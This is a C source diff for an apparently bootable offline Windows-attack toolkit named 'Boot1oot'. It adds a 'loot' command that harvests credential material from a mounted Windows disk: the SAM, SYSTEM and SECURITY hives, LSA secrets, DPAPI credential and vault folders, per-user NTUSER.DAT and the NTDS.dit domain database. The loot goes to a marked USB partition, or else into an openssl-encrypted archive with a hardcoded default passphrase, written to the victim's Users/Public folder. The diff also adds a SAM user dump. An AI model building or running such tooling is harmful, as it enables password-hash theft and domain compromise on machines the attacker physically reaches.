@@ -11,17 +11,24 @@
 #include <sys/mount.h>
 #include <sys/types.h>
 #include <sys/wait.h>
+#include <time.h>
 #include <unistd.h>
 
 #define MAX_DEVS 128
 #define DEV_NAME_MAX 64
 #define WIN_MOUNT_ROOT "/mnt/windows"
 #define DISLOCKER_MOUNTPOINT "/run/boot1oot/dislocker"
+#define LOOT_MOUNTPOINT "/loot"
+#define LOOT_SENTINEL ".boot1oot-loot"
+#define LOOT_PUBLIC_DIR "Users/Public/Boot1oot"
+/* Change this before release builds; it only protects fallback archives from casual scanning. */
+#define LOOT_DEFAULT_PASSPHRASE "boot1oot"
 #define COLOR_RED "\033[31m"
 #define COLOR_GREEN "\033[32m"
 #define COLOR_BLUE "\033[34m"
 #define COLOR_RESET "\033[0m"
 #define BOOT1OOT_RECOVERY_KEY_ENV "BOOT1OOT_BITLOCKER_RECOVERY_KEY"
+#define BOOT1OOT_LOOT_PASSPHRASE_ENV "BOOT1OOT_LOOT_PASSPHRASE"
 
 #ifndef BOOT1OOT_BUILTIN_BITLOCKER_RECOVERY_KEY
 #define BOOT1OOT_BUILTIN_BITLOCKER_RECOVERY_KEY ""
@@ -100,6 +107,16 @@ static const char *configured_recovery_key(void)
 	return NULL;
 }
 
+static const char *configured_loot_passphrase(void)
+{
+	const char *env_passphrase = getenv(BOOT1OOT_LOOT_PASSPHRASE_ENV);
+
+	if (env_passphrase && env_passphrase[0])
+		return env_passphrase;
+
+	return LOOT_DEFAULT_PASSPHRASE;
+}
+
 static void print_banner(void)
 {
 	printf("\033[2J\033[H");
@@ -126,6 +143,22 @@ static void print_banner(void)
 	puts("   | chntpw    | pogostick.net/~pnh/ntpasswd    |");
 	puts("   +-----------+--------------------------------+");
 	puts("");
+}
+
+static void print_usage(FILE *out)
+{
+	fputs("usage: boot1oot <command> [options]\n"
+	      "\n"
+	      "commands:\n"
+	      "  chntpw	list users, prompt, then launch upstream chntpw\n"
+	      "  dislocker	[-r|-rw] unlock and mount all BitLocker Windows volumes\n"
+	      "  mount    	[-r|-rw] scan and mount all Windows volumes\n"
+	      "  scan     	list NTFS and BitLocker candidate volumes\n"
+	      "  users    	export SAM user data with reged and show decoded users\n"
+	      "  loot     	collect offline Windows secrets to USB loot or encrypted fallback\n"
+	      "  unmount  	unmount Boot1oot Windows and dislocker mountpoints\n"
+	      "  init     	show the OS banner and start the shell\n",
+	      out);
 }
 
 static int ensure_dir(const char *path, mode_t mode)
@@ -161,6 +194,8 @@ static int ensure_runtime_filesystems(void)
 		printf("init: cannot create /dev: %s\n", strerror(errno));
 		return -1;
 	}
+
+	ensure_dir(LOOT_MOUNTPOINT, 0755);
 
 	if (mount_if_needed("proc", "/proc", "proc", MS_NOSUID | MS_NOEXEC | MS_NODEV, NULL) != 0) {
 		printf("init: cannot mount /proc: %s\n", strerror(errno));
@@ -560,6 +595,34 @@ static int run_sbin_program(char *const argv[])
 
 		snprintf(path, sizeof(path), "/usr/sbin/%s", argv[0]);
 		execv(path, argv);
+		execvp(argv[0], argv);
+		fprintf(stderr, "%s: cannot exec: %s\n", argv[0], strerror(errno));
+		_exit(127);
+	}
+
+	if (waitpid(pid, &status, 0) < 0) {
+		print_fail("%s: wait failed: %s", argv[0], strerror(errno));
+		return 127;
+	}
+
+	if (!WIFEXITED(status))
+		return 127;
+
+	return WEXITSTATUS(status);
+}
+
+static int run_program(char *const argv[])
+{
+	pid_t pid;
+	int status;
+
+	pid = fork();
+	if (pid < 0) {
+		print_fail("%s: fork failed: %s", argv[0], strerror(errno));
+		return 127;
+	}
+
+	if (pid == 0) {
 		execvp(argv[0], argv);
 		fprintf(stderr, "%s: cannot exec: %s\n", argv[0], strerror(errno));
 		_exit(127);
@@ -1033,6 +1096,141 @@ static int run_chntpw_list(enum mount_mode mount_mode)
 	return run_sbin_program(argv);
 }
 
+static int run_reged_export(const char *hive_path, const char *prefix,
+			    const char *key, const char *output_path)
+{
+	char *const argv[] = {
+		"reged",
+		"-x",
+		(char *)hive_path,
+		(char *)prefix,
+		(char *)key,
+		(char *)output_path,
+		NULL,
+	};
+
+	unlink(output_path);
+	print_info("reged: export %s %s -> %s", prefix, key, output_path);
+	return run_sbin_program(argv);
+}
+
+static int ensure_file_parent_dirs(const char *path)
+{
+	char tmp[512];
+	char *slash;
+
+	if (strlen(path) >= sizeof(tmp))
+		return -1;
+
+	snprintf(tmp, sizeof(tmp), "%s", path);
+	slash = strrchr(tmp, '/');
+	if (!slash || slash == tmp)
+		return 0;
+
+	*slash = '\0';
+	return ensure_parent_dirs(tmp);
+}
+
+static int copy_file(const char *src, const char *dst)
+{
+	char buf[16384];
+	int in_fd;
+	int out_fd;
+	ssize_t got;
+	int rc = 0;
+
+	in_fd = open(src, O_RDONLY | O_CLOEXEC);
+	if (in_fd < 0) {
+		print_fail("copy failed: cannot open %s: %s", src, strerror(errno));
+		return -1;
+	}
+
+	if (ensure_file_parent_dirs(dst) != 0) {
+		print_fail("copy failed: cannot create parent directory for %s: %s",
+			   dst, strerror(errno));
+		close(in_fd);
+		return -1;
+	}
+
+	unlink(dst);
+	out_fd = open(dst, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
+	if (out_fd < 0) {
+		print_fail("copy failed: cannot create %s: %s", dst, strerror(errno));
+		close(in_fd);
+		return -1;
+	}
+
+	while ((got = read(in_fd, buf, sizeof(buf))) > 0) {
+		ssize_t written = 0;
+
+		while (written < got) {
+			ssize_t put = write(out_fd, buf + written, (size_t)(got - written));
+
+			if (put < 0) {
+				print_fail("copy failed: cannot write %s: %s", dst, strerror(errno));
+				rc = -1;
+				goto out;
+			}
+			if (put == 0) {
+				print_fail("copy failed: short write to %s", dst);
+				rc = -1;
+				goto out;
+			}
+			written += put;
+		}
+	}
+
+	if (got < 0) {
+		print_fail("copy failed: cannot read %s: %s", src, strerror(errno));
+		rc = -1;
+	}
+
+out:
+	close(out_fd);
+	close(in_fd);
+	return rc;
+}
+
+static int run_chntpw_users(void)
+{
+	char mountpoint[256];
+	char sam_path[256];
+	char sam_copy[] = "/tmp/boot1oot-SAM";
+	char *const argv[] = {
+		"chntpw",
+		"-l",
+		sam_copy,
+		NULL,
+	};
+
+	if (ensure_chntpw_sam(mountpoint, sizeof(mountpoint), MOUNT_READ_ONLY,
+			      sam_path, sizeof(sam_path)) != 0)
+		return 1;
+
+	if (run_reged_export(sam_path, "HKEY_LOCAL_MACHINE\\SAM",
+			     "\\SAM\\Domains\\Account\\Users",
+			     "/tmp/boot1oot-sam-users.reg") != 0) {
+		print_fail("users failed: reged could not export SAM users");
+		return 1;
+	}
+	if (run_reged_export(sam_path, "HKEY_LOCAL_MACHINE\\SAM",
+			     "\\SAM\\Domains\\Builtin\\Aliases",
+			     "/tmp/boot1oot-sam-builtin-aliases.reg") != 0)
+		print_fail("users: optional Builtin Aliases export failed");
+	if (run_reged_export(sam_path, "HKEY_LOCAL_MACHINE\\SAM",
+			     "\\SAM\\Domains\\Account\\Aliases",
+			     "/tmp/boot1oot-sam-account-aliases.reg") != 0)
+		print_fail("users: optional Account Aliases export failed");
+
+	print_info("users: reged exports written under /tmp/boot1oot-sam-*.reg");
+	if (copy_file(sam_path, sam_copy) != 0)
+		return 1;
+
+	print_info("users: copied SAM to %s for read-only decoding", sam_copy);
+	print_info("users: decoded SAM table follows; *BLANK* means no NT password hash");
+	return run_sbin_program(argv);
+}
+
 static int prompt_chntpw_username(char *username, size_t username_len)
 {
 	char *start;
@@ -1097,16 +1295,12 @@ static int run_chntpw(int argc, char **argv)
 {
 	char username[128];
 
+	(void)argv;
+
 	if (ensure_runtime_filesystems() != 0) {
 		print_fail("chntpw failed: runtime filesystem setup failed");
 		return 1;
 	}
-
-	if (argc == 3 && (strcmp(argv[2], "-l") == 0 || strcmp(argv[2], "--list") == 0))
-		return run_chntpw_list(MOUNT_READ_ONLY);
-
-	if (argc == 4 && (strcmp(argv[2], "-u") == 0 || strcmp(argv[2], "--user") == 0))
-		return run_chntpw_edit(argv[3]);
 
 	if (argc != 2)
 		return 2;
@@ -1120,6 +1314,539 @@ static int run_chntpw(int argc, char **argv)
 	}
 
 	return run_chntpw_edit(username);
+}
+
+static int mountpoint_source(const char *mountpoint, char *source, size_t source_len)
+{
+	FILE *fp;
+	char line[512];
+
+	fp = fopen("/proc/mounts", "r");
+	if (!fp)
+		return -1;
+
+	while (fgets(line, sizeof(line), fp)) {
+		char src[128];
+		char dst[128];
+
+		if (sscanf(line, "%127s %127s %*s %*s %*d %*d", src, dst) != 2)
+			continue;
+
+		if (strcmp(dst, mountpoint) == 0) {
+			snprintf(source, source_len, "%s", src);
+			fclose(fp);
+			return 0;
+		}
+	}
+
+	fclose(fp);
+	return -1;
+}
+
+static int is_loot_partition_mounted(void)
+{
+	char source[128];
+
+	return mountpoint_source(LOOT_MOUNTPOINT, source, sizeof(source)) == 0;
+}
+
+static int loot_sentinel_exists(void)
+{
+	char path[128];
+
+	snprintf(path, sizeof(path), "%s/%s", LOOT_MOUNTPOINT, LOOT_SENTINEL);
+	return path_exists(path);
+}
+
+static int mount_loot_candidate(const char *dev)
+{
+	const char *ro_data = "utf8=1,shortname=mixed";
+	const char *rw_data = "utf8=1,shortname=mixed,flush";
+
+	if (mount(dev, LOOT_MOUNTPOINT, "vfat", MS_RDONLY | MS_NOATIME, ro_data) != 0)
+		return 1;
+
+	if (!loot_sentinel_exists()) {
+		umount2(LOOT_MOUNTPOINT, 0);
+		return 1;
+	}
+
+	umount2(LOOT_MOUNTPOINT, 0);
+	if (mount(dev, LOOT_MOUNTPOINT, "vfat", MS_NOATIME | MS_SYNCHRONOUS, rw_data) == 0) {
+		print_success("loot mounted: %s -> %s", dev, LOOT_MOUNTPOINT);
+		return 0;
+	}
+
+	print_fail("loot: found Boot1oot loot partition at %s but could not mount read-write: %s",
+		   dev, strerror(errno));
+	return 1;
+}
+
+static int run_loot_mount(void)
+{
+	FILE *fp;
+	char line[256];
+	int attempted = 0;
+
+	if (ensure_runtime_filesystems() != 0) {
+		print_fail("loot failed: runtime filesystem setup failed");
+		return 1;
+	}
+
+	if (ensure_dir(LOOT_MOUNTPOINT, 0755) != 0) {
+		print_fail("loot failed: cannot create %s: %s", LOOT_MOUNTPOINT, strerror(errno));
+		return 1;
+	}
+
+	if (is_loot_partition_mounted()) {
+		if (loot_sentinel_exists()) {
+			print_success("loot already mounted at %s", LOOT_MOUNTPOINT);
+			return 0;
+		}
+		print_fail("loot failed: %s is mounted but is not a Boot1oot loot partition",
+			   LOOT_MOUNTPOINT);
+		return 1;
+	}
+
+	fp = fopen("/proc/partitions", "r");
+	if (!fp) {
+		print_fail("loot failed: cannot read /proc/partitions: %s", strerror(errno));
+		return 1;
+	}
+
+	while (fgets(line, sizeof(line), fp)) {
+		unsigned int major;
+		unsigned int minor;
+		unsigned long long blocks;
+		char name[DEV_NAME_MAX];
+		char dev[DEV_NAME_MAX + 6];
+
+		if (sscanf(line, " %u %u %llu %63s", &major, &minor, &blocks, name) != 4)
+			continue;
+
+		if (strncmp(name, "loop", 4) == 0 || strncmp(name, "ram", 3) == 0 ||
+		    strncmp(name, "sr", 2) == 0)
+			continue;
+
+		snprintf(dev, sizeof(dev), "/dev/%s", name);
+		attempted++;
+		if (mount_loot_candidate(dev) == 0) {
+			fclose(fp);
+			return 0;
+		}
+	}
+
+	fclose(fp);
+
+	if (attempted == 0)
+		print_fail("loot failed: no block devices found to probe");
+	else
+		print_fail("loot failed: no Boot1oot loot partition found");
+
+	return 1;
+}
+
+struct loot_stats {
+	int copied;
+	int skipped;
+	int failed;
+};
+
+static int copy_tree_recursive(const char *src, const char *dst, struct loot_stats *stats)
+{
+	struct stat st;
+
+	if (lstat(src, &st) != 0)
+		return -1;
+
+	if (S_ISDIR(st.st_mode)) {
+		DIR *dir;
+		struct dirent *entry;
+		int failed = 0;
+
+		if (ensure_parent_dirs(dst) != 0) {
+			print_fail("loot: cannot create %s: %s", dst, strerror(errno));
+			stats->failed++;
+			return -1;
+		}
+
+		dir = opendir(src);
+		if (!dir) {
+			print_fail("loot: cannot read %s: %s", src, strerror(errno));
+			stats->failed++;
+			return -1;
+		}
+
+		while ((entry = readdir(dir)) != NULL) {
+			char child_src[512];
+			char child_dst[512];
+
+			if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
+				continue;
+
+			snprintf(child_src, sizeof(child_src), "%s/%s", src, entry->d_name);
+			snprintf(child_dst, sizeof(child_dst), "%s/%s", dst, entry->d_name);
+			if (copy_tree_recursive(child_src, child_dst, stats) != 0)
+				failed = 1;
+		}
+
+		closedir(dir);
+		return failed ? -1 : 0;
+	}
+
+	if (S_ISREG(st.st_mode)) {
+		if (copy_file(src, dst) == 0) {
+			stats->copied++;
+			return 0;
+		}
+		stats->failed++;
+		return -1;
+	}
+
+	stats->skipped++;
+	return 0;
+}
+
+static int loot_copy_relative(const char *windows_root, const char *relative,
+			      const char *stage, struct loot_stats *stats)
+{
+	char src[512];
+	char dst[512];
+
+	snprintf(src, sizeof(src), "%s/%s", windows_root, relative);
+	if (!path_exists(src))
+		return 0;
+
+	snprintf(dst, sizeof(dst), "%s/windows/%s", stage, relative);
+	print_info("loot: collect %s", relative);
+	return copy_tree_recursive(src, dst, stats);
+}
+
+static void loot_collect_user_profile(const char *windows_root, const char *user,
+				      const char *stage, struct loot_stats *stats)
+{
+	const char *items[] = {
+		"NTUSER.DAT",
+		"AppData/Local/Microsoft/Credentials",
+		"AppData/Local/Microsoft/Protect",
+		"AppData/Local/Microsoft/Vault",
+		"AppData/Roaming/Microsoft/Credentials",
+		"AppData/Roaming/Microsoft/Crypto",
+		"AppData/Roaming/Microsoft/Protect",
+		"AppData/Roaming/Microsoft/SystemCertificates",
+		"AppData/Roaming/Microsoft/Vault",
+		"AppData/Local/Microsoft/Windows/UsrClass.dat",
+		NULL,
+	};
+	size_t i;
+
+	for (i = 0; items[i]; i++) {
+		char rel[256];
+
+		snprintf(rel, sizeof(rel), "Users/%s/%s", user, items[i]);
+		loot_copy_relative(windows_root, rel, stage, stats);
+	}
+}
+
+static void loot_collect_user_profiles(const char *windows_root, const char *stage,
+				       struct loot_stats *stats)
+{
+	char users_dir[512];
+	DIR *dir;
+	struct dirent *entry;
+
+	snprintf(users_dir, sizeof(users_dir), "%s/Users", windows_root);
+	dir = opendir(users_dir);
+	if (!dir)
+		return;
+
+	while ((entry = readdir(dir)) != NULL) {
+		char profile_path[512];
+		struct stat st;
+
+		if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
+			continue;
+
+		snprintf(profile_path, sizeof(profile_path), "%s/%s", users_dir, entry->d_name);
+		if (stat(profile_path, &st) != 0 || !S_ISDIR(st.st_mode))
+			continue;
+
+		loot_collect_user_profile(windows_root, entry->d_name, stage, stats);
+	}
+
+	closedir(dir);
+}
+
+static int write_loot_manifest(const char *stage, const char *windows_root)
+{
+	char path[512];
+	FILE *fp;
+	time_t now = time(NULL);
+
+	snprintf(path, sizeof(path), "%s/MANIFEST.txt", stage);
+	if (ensure_file_parent_dirs(path) != 0)
+		return -1;
+
+	fp = fopen(path, "w");
+	if (!fp)
+		return -1;
+
+	fprintf(fp, "Boot1oot offline loot collection\n");
+	fprintf(fp, "source_root=%s\n", windows_root);
+	fprintf(fp, "unix_time=%lld\n", (long long)now);
+	fprintf(fp, "\nCollected classes:\n");
+	fprintf(fp, "- Registry hives: SAM, SYSTEM, SECURITY, SOFTWARE, DEFAULT, transaction logs, RegBack\n");
+	fprintf(fp, "- LSA secrets at rest: SECURITY hive with SYSTEM bootkey material\n");
+	fprintf(fp, "- DPAPI material: user and machine Protect/Credentials/Vault/Crypto paths\n");
+	fprintf(fp, "- Domain controller database if present: Windows/NTDS/NTDS.dit\n");
+	fclose(fp);
+	return 0;
+}
+
+static int collect_offline_loot(const char *windows_root, const char *stage)
+{
+	const char *system_items[] = {
+		"Windows/System32/config/SAM",
+		"Windows/System32/config/SAM.LOG1",
+		"Windows/System32/config/SAM.LOG2",
+		"Windows/System32/config/SYSTEM",
+		"Windows/System32/config/SYSTEM.LOG1",
+		"Windows/System32/config/SYSTEM.LOG2",
+		"Windows/System32/config/SECURITY",
+		"Windows/System32/config/SECURITY.LOG1",
+		"Windows/System32/config/SECURITY.LOG2",
+		"Windows/System32/config/SOFTWARE",
+		"Windows/System32/config/SOFTWARE.LOG1",
+		"Windows/System32/config/SOFTWARE.LOG2",
+		"Windows/System32/config/DEFAULT",
+		"Windows/System32/config/DEFAULT.LOG1",
+		"Windows/System32/config/DEFAULT.LOG2",
+		"Windows/System32/config/RegBack",
+		"Windows/System32/Microsoft/Protect",
+		"Windows/System32/config/systemprofile/AppData/Local/Microsoft/Credentials",
+		"Windows/System32/config/systemprofile/AppData/Local/Microsoft/Crypto",
+		"Windows/System32/config/systemprofile/AppData/Local/Microsoft/Protect",
+		"Windows/System32/config/systemprofile/AppData/Local/Microsoft/Vault",
+		"Windows/System32/config/systemprofile/AppData/Roaming/Microsoft/Credentials",
+		"Windows/System32/config/systemprofile/AppData/Roaming/Microsoft/Crypto",
+		"Windows/System32/config/systemprofile/AppData/Roaming/Microsoft/Protect",
+		"Windows/System32/config/systemprofile/AppData/Roaming/Microsoft/Vault",
+		"ProgramData/Microsoft/Crypto",
+		"ProgramData/Microsoft/Protect",
+		"ProgramData/Microsoft/Vault",
+		"Windows/NTDS/NTDS.dit",
+		NULL,
+	};
+	struct loot_stats stats = { 0, 0, 0 };
+	size_t i;
+
+	if (ensure_parent_dirs(stage) != 0) {
+		print_fail("loot failed: cannot create stage %s: %s", stage, strerror(errno));
+		return 1;
+	}
+
+	write_loot_manifest(stage, windows_root);
+	for (i = 0; system_items[i]; i++)
+		loot_copy_relative(windows_root, system_items[i], stage, &stats);
+	loot_collect_user_profiles(windows_root, stage, &stats);
+
+	print_info("loot: staged %d file(s), skipped %d special item(s), %d failure(s)",
+		   stats.copied, stats.skipped, stats.failed);
+	if (stats.copied == 0 || stats.failed > 0)
+		return 1;
+
+	return 0;
+}
+
+static void make_loot_id(char *out, size_t out_len)
+{
+	time_t now = time(NULL);
+
+	snprintf(out, out_len, "boot1oot-loot-%lld-%ld", (long long)now, (long)getpid());
+}
+
+static int store_loot_on_usb(const char *stage, const char *loot_id)
+{
+	char dest[512];
+	struct loot_stats stats = { 0, 0, 0 };
+	int rc;
+	int unmount_failed = 0;
+
+	if (run_loot_mount() != 0)
+		return 1;
+
+	snprintf(dest, sizeof(dest), "%s/%s", LOOT_MOUNTPOINT, loot_id);
+	print_info("loot: writing staged collection to %s", dest);
+	rc = copy_tree_recursive(stage, dest, &stats);
+
+	chdir("/");
+	if (umount2(LOOT_MOUNTPOINT, 0) == 0)
+		print_success("loot: unmounted %s", LOOT_MOUNTPOINT);
+	else {
+		print_fail("loot: could not unmount %s: %s", LOOT_MOUNTPOINT, strerror(errno));
+		unmount_failed = 1;
+	}
+
+	if (rc == 0 && stats.failed == 0 && !unmount_failed) {
+		print_success("loot saved to USB: %s", dest);
+		return 0;
+	}
+
+	print_fail("loot: USB write failed");
+	return 1;
+}
+
+static int create_encrypted_loot_archive(const char *loot_id, char *archive_path,
+					 size_t archive_path_len)
+{
+	const char *passphrase = configured_loot_passphrase();
+	char tar_path[256];
+	char iter[] = "200000";
+	char *tar_argv[] = {
+		"tar",
+		"-C",
+		"/tmp",
+		"-cf",
+		tar_path,
+		(char *)loot_id,
+		NULL,
+	};
+	char *openssl_argv[] = {
+		"openssl",
+		"enc",
+		"-aes-256-cbc",
+		"-salt",
+		"-pbkdf2",
+		"-iter",
+		iter,
+		"-pass",
+		"env:" BOOT1OOT_LOOT_PASSPHRASE_ENV,
+		"-in",
+		tar_path,
+		"-out",
+		archive_path,
+		NULL,
+	};
+
+	if (!passphrase) {
+		print_fail("loot fallback failed: set %s before writing secrets to Windows",
+			   BOOT1OOT_LOOT_PASSPHRASE_ENV);
+		return 1;
+	}
+
+	snprintf(tar_path, sizeof(tar_path), "/tmp/%s.tar", loot_id);
+	snprintf(archive_path, archive_path_len, "/tmp/%s.tar.enc", loot_id);
+	unlink(tar_path);
+	unlink(archive_path);
+
+	print_info("loot fallback: creating tar archive");
+	if (run_program(tar_argv) != 0) {
+		print_fail("loot fallback failed: tar could not create %s", tar_path);
+		return 1;
+	}
+
+	setenv(BOOT1OOT_LOOT_PASSPHRASE_ENV, passphrase, 1);
+	print_info("loot fallback: encrypting archive with openssl aes-256-cbc pbkdf2");
+	if (run_program(openssl_argv) != 0) {
+		print_fail("loot fallback failed: openssl encryption failed");
+		return 1;
+	}
+
+	unlink(tar_path);
+	return 0;
+}
+
+static int find_or_mount_windows_root_for_loot(char *mountpoint, size_t mountpoint_len,
+					       enum mount_mode mode)
+{
+	int rc;
+
+	rc = find_mounted_windows_root(mountpoint, mountpoint_len);
+	if (rc == 2) {
+		print_info("loot: no mounted Windows root found; attempting automatic %s mount",
+			   mount_mode_name(mode));
+		if (scan_and_mount_windows(mode) != 0)
+			return 1;
+		rc = find_mounted_windows_root(mountpoint, mountpoint_len);
+	}
+
+	return rc == 0 ? 0 : 1;
+}
+
+static int run_unmount(void);
+
+static int copy_archive_to_windows_public(const char *archive_path, const char *loot_id)
+{
+	char mountpoint[256];
+	char public_dir[512];
+	char dest[512];
+
+	if (find_or_mount_windows_root_for_loot(mountpoint, sizeof(mountpoint),
+						MOUNT_READ_WRITE) != 0)
+		return 1;
+
+	snprintf(public_dir, sizeof(public_dir), "%s/%s", mountpoint, LOOT_PUBLIC_DIR);
+	snprintf(dest, sizeof(dest), "%s/%s.tar.enc", public_dir, loot_id);
+	if (ensure_parent_dirs(public_dir) == 0 && copy_file(archive_path, dest) == 0) {
+		print_success("loot fallback saved encrypted archive: %s", dest);
+		return 0;
+	}
+
+	print_info("loot fallback: retrying with a fresh read-write Windows mount");
+	run_unmount();
+	if (scan_and_mount_windows(MOUNT_READ_WRITE) != 0)
+		return 1;
+	if (find_mounted_windows_root(mountpoint, sizeof(mountpoint)) != 0)
+		return 1;
+
+	snprintf(public_dir, sizeof(public_dir), "%s/%s", mountpoint, LOOT_PUBLIC_DIR);
+	snprintf(dest, sizeof(dest), "%s/%s.tar.enc", public_dir, loot_id);
+	if (ensure_parent_dirs(public_dir) != 0 || copy_file(archive_path, dest) != 0) {
+		print_fail("loot fallback failed: could not write %s", dest);
+		return 1;
+	}
+
+	print_success("loot fallback saved encrypted archive: %s", dest);
+	return 0;
+}
+
+static int run_loot(int argc, char **argv)
+{
+	char mountpoint[256];
+	char loot_id[96];
+	char stage[160];
+	char archive_path[256];
+
+	(void)argv;
+
+	if (argc != 2)
+		return 2;
+
+	if (ensure_runtime_filesystems() != 0) {
+		print_fail("loot failed: runtime filesystem setup failed");
+		return 1;
+	}
+
+	if (find_or_mount_windows_root_for_loot(mountpoint, sizeof(mountpoint),
+						MOUNT_READ_ONLY) != 0) {
+		print_fail("loot failed: no Windows root available");
+		return 1;
+	}
+
+	make_loot_id(loot_id, sizeof(loot_id));
+	snprintf(stage, sizeof(stage), "/tmp/%s", loot_id);
+	print_info("loot: staging offline artifacts from %s", mountpoint);
+	if (collect_offline_loot(mountpoint, stage) != 0)
+		return 1;
+
+	if (store_loot_on_usb(stage, loot_id) == 0)
+		return 0;
+
+	print_info("loot: USB loot storage unavailable; using encrypted Windows fallback");
+	if (create_encrypted_loot_archive(loot_id, archive_path, sizeof(archive_path)) != 0)
+		return 1;
+
+	return copy_archive_to_windows_public(archive_path, loot_id);
 }
 
 static int unmount_children(const char *root)
@@ -1196,6 +1923,20 @@ static int run_unmount(void)
 	print_info("unmount: dislocker FUSE mountpoints");
 	failed += unmount_children(DISLOCKER_MOUNTPOINT);
 
+	print_info("unmount: persistent loot mountpoint");
+	if (umount2(LOOT_MOUNTPOINT, 0) == 0)
+		print_success("unmount success: %s", LOOT_MOUNTPOINT);
+	else if (errno == EINVAL)
+		print_info("unmount: %s was not mounted", LOOT_MOUNTPOINT);
+	else if (errno == EBUSY) {
+		print_fail("unmount failed: %s is busy; cd / and close any shell using it",
+			   LOOT_MOUNTPOINT);
+		failed++;
+	} else {
+		print_fail("unmount failed: %s: %s", LOOT_MOUNTPOINT, strerror(errno));
+		failed++;
+	}
+
 	if (failed) {
 		print_fail("unmount failed: one or more mountpoints are still active");
 		return 1;
@@ -1228,22 +1969,6 @@ static int parse_mount_mode(int argc, char **argv, enum mount_mode *mode)
 	return -1;
 }
 
-static void print_usage(FILE *out)
-{
-	fputs("usage: boot1oot <command> [options]\n"
-	      "\n"
-	      "commands:\n"
-	      "  chntpw           list users, prompt, then launch chntpw -u <user>\n"
-	      "  chntpw -l        list local SAM users\n"
-	      "  chntpw -u <user> launch chntpw for a selected local SAM user\n"
-	      "  dislocker [-r|-rw] unlock and mount all BitLocker Windows volumes\n"
-	      "  mount    [-r|-rw] scan and mount all Windows volumes\n"
-	      "  scan     list NTFS and BitLocker candidate volumes\n"
-	      "  unmount  unmount Boot1oot Windows and dislocker mountpoints\n"
-	      "  init     show the OS banner and start the shell\n",
-	      out);
-}
-
 static int run_init(void)
 {
 	char *const bash_argv[] = { "bash", "--rcfile", "/etc/boot1oot.bashrc", "-i", NULL };
@@ -1257,6 +1982,8 @@ static int run_init(void)
 
 	ensure_runtime_filesystems();
 	print_banner();
+	print_usage(stdout);
+	puts("");
 	fflush(stdout);
 
 	execv("/bin/bash", bash_argv);
@@ -1293,8 +2020,19 @@ int main(int argc, char **argv)
 	if (strcmp(argv[1], "scan") == 0 && argc == 2)
 		return scan_only();
 
+	if (strcmp(argv[1], "users") == 0 && argc == 2)
+		return run_chntpw_users();
+
 	if (strcmp(argv[1], "chntpw") == 0) {
 		int rc = run_chntpw(argc, argv);
+
+		if (rc == 2)
+			print_usage(stderr);
+		return rc;
+	}
+
+	if (strcmp(argv[1], "loot") == 0) {
+		int rc = run_loot(argc, argv);
 
 		if (rc == 2)
 			print_usage(stderr);
